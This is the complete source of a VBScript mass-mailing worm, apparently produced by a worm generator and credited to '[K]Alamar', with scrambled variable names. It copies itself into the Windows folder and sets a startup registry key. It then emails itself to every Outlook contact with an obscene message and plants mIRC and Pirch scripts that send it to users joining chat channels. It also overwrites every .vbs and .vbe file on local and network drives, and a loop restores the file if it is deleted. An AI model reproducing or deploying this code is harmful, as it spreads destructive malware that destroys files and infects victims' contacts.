'Vbs.Worm Created By [K]Alamar
On Error Resume Next
Set Ei050v2OX9T= Createobject("scripting.filesystemobject")
Ei050v2OX9T.copyfile wscript.scriptfullname,Ei050v2OX9T.GetSpecialFolder(0)& "\1.vbs"
Set Teks2agT4Jf = CreateObject("WScript.Shell")
Teks2agT4Jf.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Worm","wscript.exe "&Ei050v2OX9T.GetSpecialFolder(0)& "\1.vbs %"
if Teks2agT4Jf.regread ("HKCU\software\Worm\mailed") <> "1" then
KrU78o7WE83()
end if
if Teks2agT4Jf.regread ("HKCU\software\Worm\mirqued") <> "1" then
q9W2U81bqhW ""
end if
if Teks2agT4Jf.regread ("HKCU\software\Worm\pirched") <> "1" then
I8q029dXEN9 ""
end if
tE9ksRg8nFb()
Set bcf3BI3zmhk= Ei050v2OX9T.opentextfile(wscript.scriptfullname, 1)
LPh6n5mlDQL= bcf3BI3zmhk.readall
bcf3BI3zmhk.Close
Do
If Not (Ei050v2OX9T.fileexists(wscript.scriptfullname)) Then
Set x0eDb1ym8V8= Ei050v2OX9T.createtextfile(wscript.scriptfullname, True)
x0eDb1ym8V8.writeLPh6n5mlDQL
x0eDb1ym8V8.Close
End If
Loop
Function KrU78o7WE83()
On Error Resume Next
Set Udm322Ag4uN = CreateObject("Outlook.Application")
If Udm322Ag4uN= "Outlook"Then
Set c780XdyVTgc=Udm322Ag4uN.GetNameSpace("MAPI")
Set GswiQ594x4B= c780XdyVTgc.AddressLists
For Each f5DF4zizG2L In GswiQ594x4B
If f5DF4zizG2L.AddressEntries.Count <> 0 Then
hYupC9AI9i2 = f5DF4zizG2L.AddressEntries.Count
For QKG5DY4lRL8= 1 To hYupC9AI9i2
Set wA449fIvXA0 = Udm322Ag4uN.CreateItem(0)
Set aX131h052bG = f5DF4zizG2L.AddressEntries(QKG5DY4lRL8)
wA449fIvXA0.To = aX131h052bG.Address
wA449fIvXA0.Subject = "Here you have, ;o)"
wA449fIvXA0.Body = "Hi:" & vbcrlf & "Check This! Fuck you mother fucker!" & vbcrlf & "Suck my dick! And disk!" & vbcrlf & ""
set NoSO1LnI3YT=wA449fIvXA0.Attachments
NoSO1LnI3YT.Add Ei050v2OX9T.GetSpecialFolder(0)& "\1.vbs"
wA449fIvXA0.DeleteAfterSubmit = True
If wA449fIvXA0.To <> "" Then
wA449fIvXA0.Send
Teks2agT4Jf.regwrite "HKCU\software\Worm\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function q9W2U81bqhW(VGy235cpkn7)
On Error Resume Next
if VGy235cpkn7 = "" then
if Ei050v2OX9T.fileexists("c:\mirc\mirc.ini") then VGy235cpkn7="c:\mirc"
if Ei050v2OX9T.fileexists("c:\mirc32\mirc.ini") then VGy235cpkn7="c:\mirc32"
VO7qypo2T74=Teks2agT4Jf.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if Ei050v2OX9T.fileexists(VO7qypo2T74 & "\mirc\mirc.ini") then VGy235cpkn7=VO7qypo2T74 & "\mirc"
end if
if VGy235cpkn7 <> "" then
set hhGe2bSs49j = Ei050v2OX9T.CreateTextFile(VGy235cpkn7 & "\script.ini", True)
hhGe2bSs49j.WriteLine "[script]"
hhGe2bSs49j.writeline "n0=on 1:JOIN:#:{"
hhGe2bSs49j.writeline "n1=  /if ( $nick == $me ) { halt }"
hhGe2bSs49j.writeline "n2=  /." & chr(100) & chr(99) & chr(99) & " send $nick "&Ei050v2OX9T.GetSpecialFolder(0)& "\1.vbs" & vbCrLf & "n3=}"
hhGe2bSs49j.close
Teks2agT4Jf.regwrite "HKCU\software\Worm\Mirqued", "1"
end if
end function
function I8q029dXEN9(fqo3cDjjyQf)
On Error Resume Next
if fqo3cDjjyQf="" then
if Ei050v2OX9T.fileexists("c:\pirch\Pirch32.exe") then fqo3cDjjyQf="c:\pirch"
if Ei050v2OX9T.fileexists("c:\pirch32\Pirch32.exe") then fqo3cDjjyQf="c:\pirch32"
f0hBgbY4WDT=Teks2agT4Jf.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if Ei050v2OX9T.fileexists(f0hBgbY4WDT & "\pirch\Pirch32.exe") then fqo3cDjjyQf=f0hBgbY4WDT & "\pirch\Pirch32.exe"
end if
if fqo3cDjjyQf <> "" then
set S6J5XlcJ336= Ei050v2OX9T.CreateTextFile(fqo3cDjjyQf & "\events.ini", True)
S6J5XlcJ336.WriteLine "[Levels]"
S6J5XlcJ336.WriteLine "Enabled=1"
S6J5XlcJ336.WriteLine "Count=6"
S6J5XlcJ336.WriteLine "Level1=000-Unknowns"
S6J5XlcJ336.WriteLine "000-UnknownsEnabled=1"
S6J5XlcJ336.WriteLine "Level2=100-Level 100"
S6J5XlcJ336.WriteLine "100-Level 100Enabled=1"
S6J5XlcJ336.WriteLine "Level3=200-Level 200"
S6J5XlcJ336.WriteLine "200-Level 200Enabled=1"
S6J5XlcJ336.WriteLine "Level4=300-Level 300"
S6J5XlcJ336.WriteLine " 300-Level 300Enabled=1"
S6J5XlcJ336.WriteLine "Level5=400-Level 400 "
S6J5XlcJ336.WriteLine "400-Level 400Enabled=1"
S6J5XlcJ336.WriteLine "Level6=500-Level 500"
S6J5XlcJ336.WriteLine "500-Level 500Enabled=1"
S6J5XlcJ336.WriteLine ""
S6J5XlcJ336.WriteLine "[000-Unknowns]"
S6J5XlcJ336.WriteLine "UserCount=0"
S6J5XlcJ336.WriteLine "EventCount=0"
S6J5XlcJ336.WriteLine ""
S6J5XlcJ336.WriteLine "[100-Level 100]"
S6J5XlcJ336.WriteLine "User1=*!*@*"
S6J5XlcJ336.WriteLine "UserCount=1"
S6J5XlcJ336.writeline "Event1=ON JOIN:#:/" & chr(100) & chr(99) & chr(99) & " tsend $nick " & Ei050v2OX9T.GetSpecialFolder(0) & "\1.vbs"
S6J5XlcJ336.WriteLine "EventCount=1"
S6J5XlcJ336.WriteLine ""
S6J5XlcJ336.WriteLine "[200-Level 200]"
S6J5XlcJ336.WriteLine "UserCount=0"
S6J5XlcJ336.WriteLine "EventCount=0"
S6J5XlcJ336.WriteLine ""
S6J5XlcJ336.WriteLine "[300-Level 300]"
S6J5XlcJ336.WriteLine "UserCount=0"
S6J5XlcJ336.WriteLine "EventCount=0"
S6J5XlcJ336.WriteLine ""
S6J5XlcJ336.WriteLine "[400-Level 400]"
S6J5XlcJ336.WriteLine "UserCount=0"
S6J5XlcJ336.WriteLine "EventCount=0"
S6J5XlcJ336.WriteLine ""
S6J5XlcJ336.WriteLine "[500-Level 500]"
S6J5XlcJ336.WriteLine "UserCount=0"
S6J5XlcJ336.WriteLine "EventCount=0"
S6J5XlcJ336.close
Teks2agT4Jf.regwrite "HKCU\software\Worm\pirched", "1"
end if
end function
Function tE9ksRg8nFb()
On Error Resume Next
Set nzmTjn5a5E7 = Ei050v2OX9T.Drives
For Each K3tG77M52yo In nzmTjn5a5E7
If K3tG77M52yo.Drivetype = Remote Then
LMUKl78dWce= K3tG77M52yo & "\"
Call Uhqnm5JE4zh(LMUKl78dWce)
ElseIf K3tG77M52yo.IsReady Then
LMUKl78dWce= K3tG77M52yo&"\"
Call Uhqnm5JE4zh(LMUKl78dWce)
End If
Next
End Function
Function Uhqnm5JE4zh(IeiuKrcoj49)
Dc45uEEor9Z=IeiuKrcoj49
Set cWStPJM47XZ= Ei050v2OX9T.GetFolder(Dc45uEEor9Z)
Set H8HctZ3695H= cWStPJM47XZ.Files
For Each u8JmfWw5tB2 In H8HctZ3695H
if Ei050v2OX9T.GetExtensionName(u8JmfWw5tB2.path) = "vbs" then
Ei050v2OX9T.copyfile wscript.scriptfullname , u8JmfWw5tB2.path , true
end if
if Ei050v2OX9T.GetExtensionName(u8JmfWw5tB2.path) = "vbe" then
Ei050v2OX9T.copyfile wscript.scriptfullname , u8JmfWw5tB2.path , true
end if
if u8JmfWw5tB2.name = "mirc.ini" then
q9W2U81bqhW(u8JmfWw5tB2.ParentFolder)
end if
if u8JmfWw5tB2.name = "Pirch32.exe" then
I8q029dXEN9(u8JmfWw5tB2.ParentFolder)
end if
Next
Set u8JmfWw5tB2= cWStPJM47XZ.SubFolders
For Each usrgHTnc9jj In u8JmfWw5tB2
Call Uhqnm5JE4zh(usrgHTnc9jj.path)
Next
End Function
'Vbswg 1.5. [K]Alamar.
